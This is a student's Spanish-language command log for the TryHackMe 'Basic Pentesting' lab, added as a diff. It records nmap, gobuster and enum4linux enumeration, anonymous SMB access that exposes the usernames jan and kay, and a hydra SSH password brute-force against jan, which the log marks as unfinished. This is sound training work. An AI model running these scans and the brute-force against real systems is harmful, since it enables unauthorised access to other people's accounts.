@@ -1,0 +1,63 @@
+===============================================================
+ BITÁCORA DE COMANDOS — Actividad A08 (Basic Pentesting)
+ Alumno: Nicolas Estrella — Username THM: estrellanico222
+ Fecha: 2026-10-08
+ Objetivo: máquina de laboratorio TryHackMe "Basic Pentesting"
+ (IP dinámica asignada por THM durante la sesión)
+===============================================================
+
+--- FASE 1: ESCANEO DE SERVICIOS ---
+# Descubrimiento de puertos, servicios y versiones
+nmap -sC -sV <IP_OBJETIVO>
+
+# Resultado: puertos abiertos
+#   22/tcp   ssh    OpenSSH 8.2p1 (Ubuntu)
+#   80/tcp   http   Apache httpd 2.4.41 (Ubuntu)
+#   139/tcp  smb    Samba smbd 4.6.2
+#   445/tcp  smb    Samba smbd 4.6.2
+#   NetBIOS name: BASIC2
+
+--- FASE 2: ENUMERACIÓN WEB ---
+# La web (puerto 80) muestra solo "Undergoing maintenance".
+# Búsqueda de directorios ocultos:
+gobuster dir -u http://<IP_OBJETIVO> -w /usr/share/wordlists/dirb/common.txt
+
+# Resultado relevante:
+#   /development  (Status: 301)  -> directorio oculto accesible
+# Dentro de /development: dev.txt y j.txt (notas internas del equipo).
+# Las notas revelan usuarios con iniciales J y K, y mencionan que
+# un usuario tiene una contraseña débil.
+
+--- FASE 3: ENUMERACIÓN SMB ---
+# Enumeración del servicio Samba:
+enum4linux -A <IP_OBJETIVO>
+
+# Hallazgos:
+#   - Recurso compartido "Anonymous" accesible SIN credenciales.
+#   - Política de contraseñas débil: longitud mínima 5, sin complejidad.
+
+# Acceso al recurso compartido anónimo:
+smbclient //<IP_OBJETIVO>/Anonymous
+# (contraseña vacía -> Enter)
+smb: \> ls
+smb: \> get staff.txt
+smb: \> exit
+
+# Lectura del archivo obtenido:
+cat staff.txt
+# Resultado: filtra los usuarios del sistema -> "jan" y "kay"
+
+--- FASE 4: EXPLOTACIÓN (FUERZA BRUTA SSH) ---
+# Ataque de diccionario contra el usuario jan por SSH:
+hydra -l jan -P /usr/share/wordlists/rockyou.txt <IP_OBJETIVO> ssh -t 4 -f
+
+# Observación: el servicio SSH limita la tasa de intentos (~30/min),
+# lo que ralentiza el ataque. Se confirma la viabilidad del vector
+# dada la política de contraseñas débil (ver informe, hallazgo H-05).
+# [Pendiente de completar en próxima sesión de laboratorio.]
+
+===============================================================
+ NOTA: todas las acciones se realizaron exclusivamente contra la
+ máquina de laboratorio autorizada de TryHackMe, en entorno
+ controlado y con fines académicos.
+===============================================================
